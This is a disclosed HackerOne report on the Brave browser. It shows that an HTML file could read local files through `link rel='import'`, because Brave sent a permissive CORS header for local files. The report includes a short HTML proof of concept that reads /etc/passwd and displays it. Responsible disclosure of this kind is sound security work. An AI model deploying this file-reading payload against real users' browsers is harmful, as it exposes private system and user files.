# Local files reading using `link[rel="import"]`

## Report Details
- **Report ID**: 375329
- **URL**: https://hackerone.com/reports/375329
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-07-02T12:25:56.922Z
- **Disclosed**: 2018-09-29T00:16:24.191Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:

HTML file could import another file using `<link rel="import">`.  Brave returns `Access-Control-Allow-Origin: *` response header for local HTML files. That leads to local files reading.

> This vulnerability makes #369218 critical.

## Products affected: 

Brave: 0.23.19 
V8: 6.7.288.46 
rev: 178c3fbc045a0cbdbe098db08307503cce952081 
Muon: 7.1.3 
OS Release: 17.6.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 67.0.3396.87

## Steps To Reproduce:

PoC:
``` html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="file:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```

## Supporting Material/References:

Screencast + PoC attached.

## Impact

Local files reading is forbidden in any browser.
Also, note that this vulnerability makes  #369218 critical.

> Probably all platforms(macOS/Win/Linux) are affected.

## Attachments
- brave-read-local-files.mp4
- exploit.html
